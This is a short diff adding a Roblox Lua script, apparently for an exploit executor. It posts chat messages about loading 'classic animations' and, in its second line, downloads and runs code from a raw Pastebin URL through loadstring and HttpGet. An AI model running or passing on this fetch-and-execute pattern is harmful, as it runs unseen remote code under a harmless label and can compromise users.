@@ -1,0 +1,4 @@
+local A_1 = "{Loading Classic Animations, Hold Tight...}" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+loadstring(game:HttpGet("https://pastebin.com/raw/pYjkmxUe", true))()
+wait(5)
+local A_1 = "{Animations Have Been Classified! Reset to Return to Normal.}" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
